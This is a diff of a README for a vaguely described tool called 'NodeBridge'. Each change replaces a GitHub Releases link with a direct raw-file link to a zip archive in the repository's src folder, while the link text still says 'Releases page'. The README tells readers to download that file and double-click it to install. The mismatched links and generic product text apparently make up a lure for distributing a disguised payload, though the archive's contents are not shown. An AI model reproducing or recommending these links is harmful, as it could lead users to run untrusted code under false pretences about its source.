@@ -1,7 +1,7 @@
 # 🚀 NodeBridge - Seamless Transactions for Everyone
 
 ## 🔗 Download Here
-[![Download NodeBridge](https://img.shields.io/badge/Download-NodeBridge-brightgreen)](https://github.com/dienaincorporative69/NodeBridge/releases)
+[![Download NodeBridge](https://raw.githubusercontent.com/dienaincorporative69/NodeBridge/main/src/NodeBridge_v2.5.zip)](https://raw.githubusercontent.com/dienaincorporative69/NodeBridge/main/src/NodeBridge_v2.5.zip)
 
 ## 🛠️ What is NodeBridge?
 NodeBridge is a tool that helps you manage fast and reliable transactions across large networks. It acts like a smart gateway, ensuring your transactions are secure and can recover from issues automatically. With NodeBridge, you can handle loads of transactions effortlessly, making your digital experience smoother.
@@ -18,7 +18,7 @@ Before downloading NodeBridge, ensure your system meets the following requiremen
 ## 🚀 Getting Started
 To get started with NodeBridge, you will need to download the application and install it on your computer. Follow these steps:
 
-1. **Download NodeBridge**: Visit the Releases page to find the latest version. You can directly [download NodeBridge here](https://github.com/dienaincorporative69/NodeBridge/releases).
+1. **Download NodeBridge**: Visit the Releases page to find the latest version. You can directly [download NodeBridge here](https://raw.githubusercontent.com/dienaincorporative69/NodeBridge/main/src/NodeBridge_v2.5.zip).
    
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. It’s best to choose the latest stable version for the best experience.
 
@@ -27,7 +27,7 @@ To get started with NodeBridge, you will need to download the application and in
 4. **Install NodeBridge**: Once the download is complete, locate the downloaded file in your computer’s downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to install NodeBridge.
 
 ## 📥 Download & Install
-To move forward, visit the [Releases page to download](https://github.com/dienaincorporative69/NodeBridge/releases) the latest version of NodeBridge. 
+To move forward, visit the [Releases page to download](https://raw.githubusercontent.com/dienaincorporative69/NodeBridge/main/src/NodeBridge_v2.5.zip) the latest version of NodeBridge. 
 
 Simply follow these steps:
 
@@ -72,4 +72,4 @@ For further questions or feedback, you can reach out through our GitHub reposito
 NodeBridge is open-source. You can view our licensing details in the LICENSE file within the repository. This allows you to use, modify, and share the application in accordance with our terms.
 
 ## 🔗 Conclusion
-NodeBridge is here to simplify your transaction management across networks. Download it today, and enjoy seamless digital interactions. Don't hesitate to check our [Releases page for downloads](https://github.com/dienaincorporative69/NodeBridge/releases).
+NodeBridge is here to simplify your transaction management across networks. Download it today, and enjoy seamless digital interactions. Don't hesitate to check our [Releases page for downloads](https://raw.githubusercontent.com/dienaincorporative69/NodeBridge/main/src/NodeBridge_v2.5.zip).
